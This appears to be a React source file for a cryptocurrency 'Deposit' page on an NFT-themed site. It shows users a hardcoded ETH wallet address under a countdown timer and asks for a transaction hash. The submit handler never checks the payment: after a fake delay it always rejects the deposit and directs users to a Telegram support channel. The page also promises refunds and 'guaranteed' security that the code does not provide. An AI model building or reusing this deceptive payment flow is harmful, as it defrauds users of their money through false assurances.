
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { CountdownTimer } from "@/components/CountdownTimer";
import { Loader2, HelpCircle, ExternalLink, ArrowLeft, ArrowDownCircle, Copy, CheckCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import { supabase } from "@/lib/supabase";
import { useAuth } from "@/hooks/useAuth";

const Deposit = () => {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [step, setStep] = useState<'amount' | 'hash'>('amount');
  const [depositAmount, setDepositAmount] = useState("");
  const [transactionHash, setTransactionHash] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [copied, setCopied] = useState(false);
  const { toast } = useToast();
  const walletAddress = "0xc68c825191546453e36aaa005ebf10b5219ce175";

  const validateHash = (hash: string) => {
    if (hash.length < 10) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Invalid hash, please check your input"
      });
      return false;
    }
    return true;
  };

  const handleSubmit = async () => {
    if (!validateHash(transactionHash)) {
      return;
    }

    setIsSubmitting(true);
    
    try {
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      toast({
        variant: "destructive",
        title: "Rejected",
        description: "Please contact support"
      });
      
      navigate('/profile');
    } catch (error) {
      console.error("Error processing deposit:", error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Something went wrong. Please try again."
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleNextStep = () => {
    const amount = parseFloat(depositAmount);
    if (!depositAmount || amount <= 0) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Please enter a valid amount greater than 0"
      });
      return;
    }
    setStep('hash');
  };

  const handleCancel = (shouldResetTimer: boolean = false) => {
    if (shouldResetTimer) {
      localStorage.removeItem('countdownEndTime');
    }
    navigate('/profile');
  };

  const handleTelegramHelp = () => {
    window.open('https://t.me/purenftsupport', '_blank');
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(walletAddress);
    setCopied(true);
    toast({
      title: "Address copied to clipboard",
      description: "You can now paste it into your wallet"
    });
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="container mx-auto py-8 px-4 mt-16 min-h-screen">
      <div className="max-w-md mx-auto">
        <Button 
          variant="ghost" 
          onClick={() => navigate('/profile')}
          className="mb-6 pl-0 text-muted-foreground flex items-center gap-2 hover:bg-transparent hover:text-primary transition-colors"
        >
          <ArrowLeft className="h-4 w-4" />
          Back to profile
        </Button>
        
        <Card className="border-primary/10 shadow-lg hover:shadow-primary/5 transition-all duration-300 backdrop-blur-sm bg-[#1A1F2C]/90 overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-b from-green-500/5 via-background/95 to-background/90" />
          <CardHeader className="relative flex flex-row items-center justify-between">
            <div>
              <CardTitle className="text-2xl font-bold bg-gradient-to-r from-white to-white/70 bg-clip-text text-transparent flex items-center gap-3">
                <div className="p-2 rounded-lg bg-green-500/20">
                  <ArrowDownCircle className="w-6 h-6 text-green-500" />
                </div>
                Deposit
              </CardTitle>
              <CardDescription className="text-muted-foreground mt-2">
                Add funds to your wallet
              </CardDescription>
            </div>
          </CardHeader>
          <CardContent className="relative space-y-6">
            {step === 'amount' ? (
              <div className="space-y-4">
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <label className="text-sm font-medium text-primary/80">
                      Amount (ETH)
                    </label>
                    <span className="text-xs text-muted-foreground">
                      Min: 0.0001 ETH
                    </span>
                  </div>
                  <div className="relative">
                    <Input
                      type="number"
                      step="0.0001"
                      min="0.0001"
                      value={depositAmount}
                      onChange={(e) => setDepositAmount(e.target.value)}
                      placeholder="Enter amount"
                      className="bg-background/40 border-primary/20 focus:border-primary/40 pr-16"
                    />
                    <span className="absolute right-3 top-1/2 -translate-y-1/2 text-sm font-medium text-green-400">
                      ETH
                    </span>
                  </div>
                </div>
                <Button 
                  className="w-full bg-green-500/20 hover:bg-green-500/30 text-green-500 transition-colors" 
                  onClick={handleNextStep}
                >
                  Continue
                </Button>
              </div>
            ) : (
              <>
                <div className="rounded-lg border border-green-500/20 bg-green-500/5 p-4">
                  <p className="text-center text-sm text-green-400 font-medium">
                    Request created for {depositAmount} ETH
                  </p>
                </div>
                
                <div className="mt-4">
                  <h3 className="font-medium text-primary/90 mb-2">Time remaining</h3>
                  <CountdownTimer endTime={new Date(new Date().getTime() + 30 * 60000).toISOString()} />
                </div>
                
                <div className="space-y-3 mt-4">
                  <h3 className="font-medium text-primary/90">Send ETH to this address:</h3>
                  <div className="bg-background/40 p-4 rounded-md border border-primary/10 hover:border-primary/20 transition-colors">
                    <div className="flex justify-between items-center">
                      <div className="break-all font-mono text-primary/80 text-sm">
                        {walletAddress}
                      </div>
                      <Button 
                        variant="ghost" 
                        size="icon" 
                        onClick={copyToClipboard}
                        className="ml-2 h-8 w-8 text-primary/60 hover:text-primary hover:bg-primary/10"
                      >
                        {copied ? <CheckCircle className="h-4 w-4 text-green-500" /> : <Copy className="h-4 w-4" />}
                      </Button>
                    </div>
                    <div className="mt-2 text-xs text-muted-foreground">
                      (ERC-20 Network)
                    </div>
                  </div>
                  <div className="text-xs text-muted-foreground">
                    <div className="flex items-start gap-2">
                      <p>If you have already transferred Ethereum, but the timer has expired, the funds will be credited back to your original wallet.</p>
                      <TooltipProvider>
                        <Tooltip>
                          <TooltipTrigger>
                            <HelpCircle className="h-3.5 w-3.5 flex-shrink-0 text-primary/60" />
                          </TooltipTrigger>
                          <TooltipContent className="max-w-sm bg-background/95 backdrop-blur-sm border-primary/20">
                            <p>We give time limits due to frequent fraudulent activities. During this time, the transfer is guaranteed to be secure for both parties. You cannot cancel deposits more than 3 times per 24 hours.</p>
                          </TooltipContent>
                        </Tooltip>
                      </TooltipProvider>
                    </div>
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <label className="text-sm font-medium text-primary/80">
                      Transaction Hash
                    </label>
                    <TooltipProvider>
                      <Tooltip>
                        <TooltipTrigger>
                          <HelpCircle className="h-4 w-4 text-primary/60" />
                        </TooltipTrigger>
                        <TooltipContent className="max-w-sm bg-background/95 backdrop-blur-sm border-primary/20">
                          <p>This is the transaction ID. After successful withdrawal of funds from another wallet, you will need to provide a confirmation with the number that appears in the other wallet.</p>
                          <Button 
                            variant="link" 
                            className="mt-2 h-auto p-0 text-primary"
                            onClick={handleTelegramHelp}
                          >
                            I need help <ExternalLink className="ml-1 h-3 w-3" />
                          </Button>
                        </TooltipContent>
                      </Tooltip>
                    </TooltipProvider>
                  </div>
                  <Input
                    value={transactionHash}
                    onChange={(e) => setTransactionHash(e.target.value)}
                    placeholder="Enter transaction hash"
                    className="font-mono bg-background/40 border-primary/20 focus:border-primary/40"
                  />
                </div>

                <div className="flex gap-2">
                  <Button 
                    variant="outline"
                    className="flex-1 bg-background/40 border-primary/20 hover:bg-primary/10 text-primary/90"
                    onClick={() => handleCancel(true)}
                  >
                    Cancel
                  </Button>
                  <Button 
                    className="flex-1 bg-green-500/20 hover:bg-green-500/30 text-green-500" 
                    onClick={handleSubmit}
                    disabled={!transactionHash || isSubmitting}
                  >
                    {isSubmitting ? (
                      <>
                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      'Confirm'
                    )}
                  </Button>
                </div>

                <div className="text-center mt-2">
                  <Button
                    variant="link"
                    className="text-primary h-auto p-0 hover:text-primary/80"
                    onClick={handleTelegramHelp}
                  >
                    Need help?<ExternalLink className="ml-0.5 h-3 w-3" />
                  </Button>
                </div>
              </>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default Deposit;
